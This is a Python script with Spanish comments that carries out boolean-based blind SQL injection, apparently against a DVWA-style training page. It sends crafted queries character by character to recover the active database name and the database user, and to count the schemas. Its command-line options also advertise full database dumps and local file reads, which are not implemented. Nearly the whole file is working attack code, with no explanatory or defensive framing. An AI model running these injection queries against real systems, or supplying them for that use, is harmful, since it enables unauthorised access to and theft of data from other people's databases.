#!/usr/bin/env python3

import argparse
import requests


def main():

	global url
	global payload
	global cookies

	cookies = None

	argv = parse_arguments()
	
	if argv['cookies'] is not None:
		cookies = parse_cookies(argv)

	url = ''.join(argv['u'])
	payload = '&Submit=Submit'
	
	print("---> Testing target...")
	r = requests.get(url, cookies=cookies)
	
	if r is not None:
		print("--> Target is awake")

	if argv['activedb']:
		print(f"\n--> Active db: {''.join(find_active_db())}")
	
	if argv['activeuser']:
		print(f"\n--> Active user: {''.join(find_user())}")

	if argv['ndbs']:
		print(f"\n--> {find_n_db()} dbs found")
	

	#find_db()


def parse_cookies(argv):
	cookies = {}

	to_parse = argv['cookies'].split(";")

	for cookie in to_parse:
		cookie = cookie.split("=")
		cookies[cookie[0]] = cookie[1]

	return cookies

def parse_arguments():
	parser = argparse.ArgumentParser()
	dump_group = parser.add_argument_group('DUMP')

	parser.add_argument('-u', metavar='target', type=str, nargs='+', help = 'The endpoint you want to run the script over')
	parser.add_argument('--cookies', type=str, help = 'e.g. "PHPSESSID=value"')
	parser.add_argument('--data', type=str, help ='Sent over POST (e.g. user=1&pass=1)')

	dump_group.add_argument('--ndbs', help = 'Dump number of databases', action='store_true')
	dump_group.add_argument('--activedb', help = 'Dump active db', action='store_true')
	dump_group.add_argument('--activeuser', help = 'Dump active user', action='store_true')
	dump_group.add_argument('--all-db', help = 'Dump all db', action='store_true')
	
	dump_group.add_argument('--db', type=str, help = 'Dump specified db')
	dump_group.add_argument('--lfi', metavar='FILE', type=str, help = 'Attempt to dump file')

	args = parser.parse_args()
	argv = vars(args)

	return argv

def find_active_db() -> str:
	db_len = 0
	db_name = []
	i = 1

	print("--> Encontrando longitud de la base de datos activa...")
	r = requests.get(url + payload, cookies=cookies)

	# Sacar longitud del nombre
	while "First name" not in r.text:
		r = requests.get(f"{url}1' and (select length(database()))={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		i += 1

	db_len = i - 1

	print(f"--> La base de datos activa tiene {db_len} carácteres")

	print("--> Sacando nombre de la base de datos...")

	# Sacar nombre de bbdd

	i = 1
	char = 0

	while i <= db_len:
		r = requests.get(f"{url}1' and (select substring(database(),{i},1))='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)

		if "First name" in r.text:
			db_name.append(chr(char))
			print(f"\r{''.join(db_name)}", end='')
			i += 1
			char = 0
		else:
			char += 1

	return db_name

def find_user() -> str:
	user_len = 0
	user_name = []
	i = 1

	print("--> Encontrando longitud de usuario activo...")
	r = requests.get(url + payload, cookies=cookies)

	# Sacar longitud del nombre
	while "First name" not in r.text:
		r = requests.get(f"{url}1' and (select length(user()))={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		i += 1

	user_len = i - 1

	print(f"--> El usuario activo tiene {user_len} carácteres")

	print("--> Sacando nombre del usuario activo...")

	i = 1
	char = 0

	while i <= user_len:
		r = requests.get(f"{url}1' and (select substring(user(),{i},1))='{chr(char)}' -- -&Submit=Submit#", cookies=cookies)

		if "First name" in r.text:
			user_name.append(chr(char))
			print(f"\r{''.join(user_name)}", end='')
			i += 1
			char = 0
		else:
			char += 1

	return user_name


def find_n_db() -> int:

	i = 0
	r = requests.get(url + payload, cookies=cookies)

	while "First name" not in r.text:
		i += 1
		r = requests.get(f"{url}1' and (select count(schema_name) from information_schema.schemata)={i} -- -&Submit=Submit#", cookies=cookies)
		size = len(r.text)
		
	return i

	# 1' and (select count(schema_name) from information_schema.schemata)=1 -- -


if __name__ == '__main__':
	main()